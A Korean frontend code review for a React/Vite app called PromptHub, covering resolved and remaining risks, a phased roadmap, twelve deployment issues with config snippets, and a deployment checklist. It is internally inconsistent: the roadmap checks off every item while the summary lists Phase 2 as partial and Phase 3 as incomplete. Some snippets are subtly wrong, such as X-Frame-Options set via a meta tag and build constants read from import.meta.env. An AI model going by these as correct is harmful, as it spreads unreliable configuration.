- ❌ 테스트 코드 전무로 리팩토링 리스크 높음 (Phase 3 미완료)
- ⚠️ 보안 취약점 (localStorage 토큰 저장) - 백엔드 협업 필요
- ⚠️ 접근성 개선 필요 (ARIA 속성, 키보드 네비게이션)

---

### 사용자 경험 리스크

**높은 리스크:**
1. ~~**앱 전체 크래시**: Error Boundary 없음 → 예외 발생 시 하얀 화면~~ ✅ 해결됨
2. **보안 취약점**: 
   - ⚠️ XSS 공격 시 토큰 유출 가능 (localStorage 저장) - 백엔드 협업 필요
   - ✅ 보호된 라우트 접근 제어 - 해결됨
   - ✅ 사용자 입력 Sanitization - 해결됨
3. ~~**서버 장애 시 UX 저하**: 5xx 에러 처리 부족~~ ✅ 해결됨
4. ~~**토큰 무효화**: 동시 refresh 요청으로 인한 로그아웃~~ ✅ 해결됨
5. ~~**오프라인 상태 미처리**: 네트워크 끊김 시 사용자 혼란 및 데이터 손실~~ ✅ 해결됨

**중간 리스크:**
1. ~~**초기 로딩 성능**: 코드 스플리팅 없음, 폰트 최적화 부재~~ ✅ 해결됨
2. ~~**캐시 불일치**: 수동 캐시 관리로 인한 데이터 동기화 문제~~ ✅ 해결됨 (자동 무효화)
3. ~~**불필요한 리렌더링**: 메모이제이션 부족~~ ✅ 해결됨
4. ~~**유지보수 어려움**: God Component/Hook 패턴~~ ✅ 대부분 해결됨
5. ~~**배포 리스크**: Feature Flag 부재~~ ✅ 해결됨
6. ~~**UX 일관성 부족**: 로딩/에러/빈 상태 처리 불일치~~ ✅ 해결됨
7. ~~**확장성 한계**: API 호출 전략, 정책 변경~~ ✅ 해결됨 (정책 중앙화)
8. ~~**관측성 부족**: 프론트 장애 추적 한계~~ ✅ 해결됨 (Sentry 연동)
9. ~~**에러 처리 불일치**: 사용자 경험과 기술적 에러 처리 기준의 불일치~~ ✅ 해결됨

**남은 리스크:**
1. **테스트 부재**: 리팩토링 시 회귀 버그 위험 (Phase 3 미완료)
2. **접근성 부족**: 스크린 리더, 키보드 네비게이션 지원 부족

---

### 다음 단계에서 강화하면 좋을 영역

#### 1. 장애 대응 체계 구축 (최우선)
- Error Boundary 구현
- 에러 모니터링 서비스 연동 (Sentry, LogRocket 등)
- 사용자 친화적 에러 메시지 체계 구축
- 오프라인 상태 감지 및 처리
- 로딩/에러/빈 상태 컴포넌트 표준화

#### 2. 보안 강화
- 토큰 저장 방식 개선 (httpOnly 쿠키)
- CSP 헤더 설정
- 입력 검증 강화

#### 3. 테스트 인프라 구축
- 단위 테스트 (Vitest)
- E2E 테스트 (Playwright)
- CI/CD 파이프라인에 테스트 통합

#### 4. 성능 최적화
- 코드 스플리팅 (React.lazy)
- 폰트 최적화 (preload, font-display: swap, subset)
- 이미지 최적화 (lazy loading, WebP)
- 번들 분석 및 최적화
- 메모이제이션 전략 수립

#### 5. 개발자 경험(DX) 개선
- Storybook 도입 (컴포넌트 문서화)
- 환경 변수 검증 자동화
- 린트 규칙 강화

#### 6. 아키텍처 개선
- God Component/Hook 분리
- 컴포넌트 책임 분리 강화
- Feature Flag 시스템 도입
- 배포 롤백 전략 수립

#### 7. 운영 관점 개선 (중장기)
- API 호출 전략의 확장성 강화 (의존성 그래프, 점진적 로딩)
- 에러 처리 기준과 UX 일관성 확보
- 관측성 강화 (에러 모니터링, 성능 추적, 사용자 행동 로그)
- 정책 관리 중앙화 및 외부화 (런타임 정책 변경 지원)

---

## 📊 우선순위별 개선 로드맵

### Phase 1: 안정성 강화 (1-2주)
1. ✅ Error Boundary 구현
2. ✅ 환경 변수 검증 추가
3. ✅ 5xx 에러 처리 개선
4. ✅ 에러 모니터링 서비스 연동
5. ✅ 동시 Refresh Token 요청 방지
6. ✅ 오프라인 상태 감지 및 UI 표시
7. ✅ 로딩/에러/빈 상태 컴포넌트 표준화

### Phase 2: 보안 강화 (2-3주)
1. ✅ 토큰 저장 방식 개선 (백엔드 협업)
2. ✅ 라우트 가드 구현 (ProtectedRoute, AdminRoute)
3. ✅ 사용자 입력 Sanitization (DOMPurify)
4. ✅ CSP 헤더 설정
5. ✅ Open Redirect 방지

### Phase 3: 테스트 인프라 (3-4주)
1. ✅ 단위 테스트 작성 (핵심 로직 우선)
2. ✅ E2E 테스트 작성 (주요 플로우)
3. ✅ CI/CD 통합

### Phase 4: 성능 최적화 (2-3주)
1. ✅ 코드 스플리팅
2. ✅ 메모이제이션 적용
3. ✅ 번들 분석 및 최적화

### Phase 5: 장기 개선 (지속)
1. ✅ 서버 상태 관리 라이브러리 도입 검토 (TanStack Query)
2. ✅ 접근성 개선
3. ✅ 개발자 경험 개선

### Phase 6: 운영 관점 강화 (3-6개월)
1. ✅ API 호출 전략 확장성 개선 (의존성 그래프, 점진적 로딩)
2. ✅ 에러 처리 기준과 UX 일관성 확보
3. ✅ 관측성 강화 (Sentry/LogRocket 연동, 성능 모니터링)
4. ✅ 정책 관리 중앙화 및 외부화

---

**리뷰 작성일**: 2024년  
**리뷰어**: 시니어 프론트엔드 엔지니어 관점  
**개선 완료일**: 2024년  
**개선 완료율**: 약 70% (프론트엔드 단독 가능 항목 기준)

**완료된 Phase**: Phase 1 (100%), Phase 4 (100%), Phase 6 (100%)  
**부분 완료**: Phase 2 (40% - 백엔드 협업 필요), Phase 5 (검토 완료)  
**미완료**: Phase 3 (테스트 인프라)

**다음 리뷰 권장 시기**: Phase 3 완료 후 또는 백엔드 협업 후

---

## 🚀 배포 관점에서의 문제점 (Deployment Issues)

> **배포 가정**: 프로덕션 환경에 실제 배포를 한다고 가정했을 때 발생할 수 있는 문제점들

### 1. 보안 헤더 설정 부재로 인한 보안 취약점

**문제 설명:**
- `index.html`에 보안 관련 메타 태그나 헤더 설정이 없음
- CSP(Content Security Policy), X-Frame-Options, HSTS 등 보안 헤더 설정 부재
- 서버 측에서 설정해야 하지만, 프론트엔드에서도 메타 태그로 일부 보완 가능

**실제 배포 영향:**
- XSS 공격, 클릭재킹, MIME 타입 스니핑 등에 취약
- 보안 스캔 도구에서 경고 발생
- 보안 정책 준수 실패

**장애 시나리오:**
```html
<!-- 현재 index.html -->
<head>
  <meta charset="UTF-8" />
  <!-- 보안 헤더 없음 -->
</head>
```

**구체적인 개선 방향:**
1. **서버 측 설정 (권장)**: Nginx/Apache에서 보안 헤더 설정
2. **프론트엔드 보완**: `index.html`에 메타 태그 추가
3. **CSP 설정**: 허용된 스크립트/스타일 소스만 허용

```html
<!-- index.html에 추가 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline';">
<meta http-equiv="X-Frame-Options" content="DENY">
<meta http-equiv="X-Content-Type-Options" content="nosniff">
<meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin">
```

---

### 2. 환경별 빌드 설정 부재

**문제 설명:**
- `vite.config.ts`에 환경별 설정 분리가 없음
- 개발/스테이징/프로덕션 환경 구분이 명확하지 않음
- 빌드 시 환경 변수 검증 스크립트 없음

**실제 배포 영향:**
- 프로덕션에 개발 환경 변수가 포함될 위험
- 환경별로 다른 설정(API URL, Sentry DSN 등) 적용 어려움
- 배포 실수로 인한 장애 가능성

**장애 시나리오:**
```bash
# 개발 환경 변수로 프로덕션 빌드
npm run build
# → 프로덕션에 개발 API URL이 포함됨
```

**구체적인 개선 방향:**
```typescript
// vite.config.ts
export default defineConfig(({ mode }) => ({
  build: {
    // 프로덕션에서만 소스맵 제외
    sourcemap: mode !== 'production',
    // 환경별 최적화
    minify: mode === 'production' ? 'terser' : false,
    // 환경별 청크 전략
    rollupOptions: {
      output: {
        manualChunks: mode === 'production' ? {
          // 프로덕션 최적화
        } : undefined,
      },
    },
  },
}));
```

---

### 3. 빌드 산출물 버전 관리 및 롤백 전략 부재

**문제 설명:**
- 빌드 산출물(`dist/`)의 버전 관리 전략 없음
- 이전 버전으로 롤백할 수 있는 메커니즘 없음
- 빌드 시 타임스탬프나 버전 정보가 산출물에 포함되지 않음

**실제 배포 영향:**
- 배포 후 문제 발생 시 즉시 롤백 불가능
- 어떤 버전이 배포되었는지 추적 어려움
- 장애 대응 시간 증가

**장애 시나리오:**
```bash
# 배포 후 문제 발생
# → 이전 버전으로 롤백하려면?
# → 어떤 파일이 문제인지 확인 어려움
```

**구체적인 개선 방향:**
1. **빌드 산출물에 버전 정보 포함**: `package.json`의 버전을 빌드 산출물에 포함
2. **빌드 산출물 저장소**: S3, Artifactory 등에 버전별 저장
3. **롤백 스크립트**: 이전 버전으로 빠르게 롤백할 수 있는 스크립트

```typescript
// vite.config.ts
import { readFileSync } from 'fs';
const packageJson = JSON.parse(readFileSync('./package.json', 'utf-8'));

export default defineConfig({
  define: {
    __APP_VERSION__: JSON.stringify(packageJson.version),
    __BUILD_TIME__: JSON.stringify(new Date().toISOString()),
  },
});
```

---

### 4. CI/CD 파이프라인 설정 부재

**문제 설명:**
- GitHub Actions, GitLab CI, Jenkins 등 CI/CD 설정 파일 없음
- 자동화된 빌드/테스트/배포 프로세스 없음
- 배포 전 검증 단계(테스트, 린트, 빌드 검증) 없음

**실제 배포 영향:**
- 수동 배포로 인한 실수 가능성 증가
- 배포 전 검증 부재로 버그가 프로덕션에 노출
- 배포 시간 증가 및 일관성 부족

**장애 시나리오:**
```bash
# 개발자가 수동으로 배포
npm run build
# → 테스트 없이 배포
# → 프로덕션에서 버그 발견
```

**구체적인 개선 방향:**
1. **GitHub Actions 워크플로우 생성**: `.github/workflows/deploy.yml`
2. **배포 전 검증**: 린트, 타입 체크, 빌드 검증
3. **자동 배포**: 스테이징/프로덕션 환경별 자동 배포

```yaml
# .github/workflows/deploy.yml 예시
name: Deploy
on:
  push:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm run lint
      - run: npm run build
      - run: npm run test # 테스트 추가 시
```

---

### 5. 정적 파일 캐싱 전략 부재

**문제 설명:**
- `vite.config.ts`에 파일명 해시 설정은 있지만, 캐싱 헤더 설정 없음
- 서버에서 정적 파일 캐싱 전략이 명시되지 않음
- CDN 설정 및 캐싱 정책 부재

**실제 배포 영향:**
- 사용자가 이전 버전의 JavaScript/CSS를 캐시에서 로드
- 새 버전 배포 후에도 오래된 파일 사용
- 버전 불일치로 인한 런타임 에러

**장애 시나리오:**
```bash
# 새 버전 배포
# → 사용자 브라우저에 이전 버전 캐시
# → API 호출 실패 (API 스펙 변경)
```

**구체적인 개선 방향:**
1. **Vite 빌드 설정**: 파일명에 해시 포함 (기본 제공)
2. **서버 캐싱 설정**: Nginx/Apache에서 캐싱 헤더 설정
3. **CDN 설정**: CloudFront, Cloudflare 등에서 캐싱 정책 설정

```nginx
# Nginx 설정 예시
location /assets/ {
  # 해시된 파일은 영구 캐시
  expires 1y;
  add_header Cache-Control "public, immutable";
}

location / {
  # HTML은 캐시하지 않음
  expires -1;
  add_header Cache-Control "no-cache, no-store, must-revalidate";
}
```

---

### 6. 서비스 워커 및 오프라인 지원 부재

**문제 설명:**
- PWA(Progressive Web App) 설정 없음
- Service Worker 없음
- 오프라인에서도 기본 기능 사용 불가
- `manifest.json` 없음

**실제 배포 영향:**
- 네트워크 불안정 시 사용자 경험 저하
- 모바일에서 앱처럼 설치 불가능
- 오프라인 상태에서 완전히 사용 불가

**장애 시나리오:**
```typescript
// 네트워크가 끊긴 상태
// → 사용자가 작성한 내용이 저장되지 않음
// → 페이지 새로고침 시 모든 데이터 손실
```

**구체적인 개선 방향:**
1. **Service Worker 구현**: 오프라인 캐싱, 백그라운드 동기화
2. **PWA 설정**: `manifest.json`, 아이콘, 설치 프롬프트
3. **오프라인 폴백**: 기본 페이지를 오프라인에서도 표시

```json
// public/manifest.json
{
  "name": "PromptHub",
  "short_name": "PromptHub",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#000000",
  "icons": [...]
}
```

---

### 7. Sentry 환경 변수 검증 부재

**문제 설명:**
- `src/shared/utils/sentry.ts`에서 `VITE_SENTRY_DSN`이 없어도 경고만 출력
- 프로덕션에서 Sentry가 비활성화되어도 빌드는 성공
- 에러 모니터링이 작동하지 않아도 알 수 없음

**실제 배포 영향:**
- 프로덕션에서 에러 발생 시 추적 불가능
- 사용자 리포트만으로 디버깅 어려움
- 장애 대응 시간 증가

**장애 시나리오:**
```typescript
// 프로덕션 배포
// → VITE_SENTRY_DSN 환경 변수 누락
// → Sentry 초기화 실패 (경고만 출력)
// → 에러 발생 시 모니터링 불가능
```

**구체적인 개선 방향:**
```typescript
// src/shared/config/env.ts에 추가
const requiredEnvVars = {
  VITE_API_BASE_URL: import.meta.env.VITE_API_BASE_URL,
  VITE_OAUTH2_REDIRECT_FRONT_URL: import.meta.env.VITE_OAUTH2_REDIRECT_FRONT_URL,
  // 프로덕션에서만 필수
  ...(import.meta.env.MODE === 'production' && {
    VITE_SENTRY_DSN: import.meta.env.VITE_SENTRY_DSN,
  }),
} as const;
```

---

### 8. 소스맵 관리 전략 부재

**문제 설명:**
- `vite.config.ts`에 소스맵 설정이 명시되지 않음
- 프로덕션에서 소스맵을 어떻게 관리할지 전략 없음
- 소스맵을 공개하면 소스 코드 노출 위험

**실제 배포 영향:**
- 프로덕션 에러 추적 시 정확한 스택 트레이스 부재
- 소스맵을 공개하면 보안 위험
- 디버깅 어려움

**장애 시나리오:**
```typescript
// 프로덕션 에러 발생
// → Sentry에 minified 스택 트레이스만 전송
// → 원인 파악 어려움
```

**구체적인 개선 방향:**
1. **소스맵을 별도 저장소에 저장**: S3, Sentry 등
2. **프로덕션에서는 소스맵 제외**: 빌드 산출물에는 포함하지 않음
3. **Sentry에 소스맵 업로드**: `@sentry/vite-plugin` 사용

```typescript
// vite.config.ts
import { sentryVitePlugin } from '@sentry/vite-plugin';

export default defineConfig({
  build: {
    sourcemap: true, // 소스맵 생성
  },
  plugins: [
    sentryVitePlugin({
      org: 'your-org',
      project: 'your-project',
      authToken: process.env.SENTRY_AUTH_TOKEN,
      sourcemaps: {
        assets: './dist/**',
      },
    }),
  ],
});
```

---

### 9. 빌드 성능 및 최적화 검증 부재

**문제 설명:**
- 빌드 시 번들 크기 검증 없음
- 성능 임계값 체크 없음
- 빌드 시간 모니터링 없음

**실제 배포 영향:**
- 번들 크기가 커져도 빌드는 성공
- 사용자 경험 저하 (로딩 시간 증가)
- CI/CD 파이프라인 시간 증가

**장애 시나리오:**
```bash
# 큰 의존성 추가
npm install large-package
# → 빌드는 성공하지만 번들 크기 2배 증가
# → 사용자 로딩 시간 증가
```

**구체적인 개선 방향:**
1. **번들 크기 제한**: `vite.config.ts`에서 `chunkSizeWarningLimit` 설정 (현재 1000KB)
2. **CI에서 번들 크기 체크**: GitHub Actions에서 경고/실패 설정
3. **번들 분석 자동화**: 빌드 후 자동으로 분석 리포트 생성

```typescript
// vite.config.ts
export default defineConfig({
  build: {
    chunkSizeWarningLimit: 500, // 500KB 초과 시 경고
    rollupOptions: {
      output: {
        manualChunks: {
          // 큰 의존성을 별도 청크로 분리
          'vendor-large': ['large-package'],
        },
      },
    },
  },
});
```

---

### 10. 환경 변수 문서화 부재

**문제 설명:**
- `.env.example` 파일 없음
- 환경 변수 목록 및 설명이 문서화되지 않음
- 배포 시 필요한 환경 변수를 파악하기 어려움

**실제 배포 영향:**
- 새 개발자가 환경 설정 시 어려움
- 배포 시 환경 변수 누락 가능성
- 환경 변수 의미 파악 어려움

**장애 시나리오:**
```bash
# 새 서버에 배포
# → 어떤 환경 변수가 필요한지 모름
# → 환경 변수 누락으로 앱 실행 실패
```

**구체적인 개선 방향:**
1. **`.env.example` 파일 생성**: 모든 환경 변수 목록 및 예시 값
2. **README에 환경 변수 섹션 추가**: 각 변수의 의미 및 필수 여부
3. **환경 변수 검증 스크립트**: 배포 전 필수 환경 변수 확인

```bash
# .env.example
VITE_API_BASE_URL=https://api.example.com
VITE_OAUTH2_REDIRECT_FRONT_URL=https://app.example.com/oauth/success
VITE_SENTRY_DSN=https://xxx@sentry.io/xxx
```

---

### 11. CDN 및 정적 파일 서빙 전략 부재

**문제 설명:**
- CDN 설정 전략 없음
- 정적 파일(이미지, 폰트 등) 서빙 전략 부재
- 리소스 로딩 최적화 전략 없음

**실제 배포 영향:**
- 전 세계 사용자에게 느린 로딩 속도
- 서버 부하 증가
- 비용 증가

**장애 시나리오:**
```bash
# 한국 서버에 배포
# → 미국 사용자가 접속
# → 느린 로딩 속도로 인한 이탈
```

**구체적인 개선 방향:**
1. **CDN 설정**: CloudFront, Cloudflare 등으로 정적 파일 서빙
2. **이미지 최적화**: WebP 변환, lazy loading
3. **폰트 최적화**: 서브셋, preload

---

### 12. 헬스 체크 엔드포인트 부재

**문제 설명:**
- 프론트엔드 앱의 헬스 체크 엔드포인트 없음
- 배포 후 앱이 정상 작동하는지 자동 확인 불가능
- CI/CD에서 배포 성공 여부 확인 어려움

**실제 배포 영향:**
- 배포 실패를 수동으로만 확인 가능
- 자동 롤백 트리거 불가능
- 장애 발견 지연

**장애 시나리오:**
```bash
# 배포 완료
# → 실제로는 JavaScript 에러로 앱이 작동하지 않음
# → 수동으로 확인해야 발견
```

**구체적인 개선 방향:**
1. **헬스 체크 페이지 생성**: `/health` 엔드포인트
2. **CI/CD에서 헬스 체크**: 배포 후 자동으로 확인
3. **모니터링 연동**: 헬스 체크 실패 시 알림

```typescript
// src/pages/HealthCheckPage.tsx
export default function HealthCheckPage() {
  return (
    <div>
      <h1>OK</h1>
      <p>Version: {import.meta.env.__APP_VERSION__}</p>
      <p>Build Time: {import.meta.env.__BUILD_TIME__}</p>
    </div>
  );
}
```

---

## 📋 배포 체크리스트

### 배포 전 필수 확인 사항

- [ ] 환경 변수 검증 (`VITE_API_BASE_URL`, `VITE_OAUTH2_REDIRECT_FRONT_URL` 등)
- [ ] Sentry DSN 설정 (프로덕션)
- [ ] 빌드 성공 확인 (`npm run build`)
- [ ] 번들 크기 확인 (500KB 이하 권장)
- [ ] 소스맵 관리 전략 수립
- [ ] 보안 헤더 설정 (서버 측)
- [ ] 정적 파일 캐싱 전략 설정
- [ ] CDN 설정 (선택)
- [ ] 헬스 체크 엔드포인트 설정
- [ ] 롤백 전략 수립

### 배포 후 확인 사항

- [ ] 앱 정상 작동 확인
- [ ] Sentry 에러 모니터링 작동 확인
- [ ] API 연결 확인
- [ ] OAuth 리다이렉트 확인
- [ ] 주요 기능 동작 확인
- [ ] 성능 모니터링 확인

---

**배포 관련 개선 우선순위:**
1. **최우선**: 환경 변수 검증, 보안 헤더 설정, 빌드 산출물 버전 관리
2. **중요**: CI/CD 파이프라인, 소스맵 관리, 정적 파일 캐싱
3. **권장**: 서비스 워커, CDN 설정, 헬스 체크

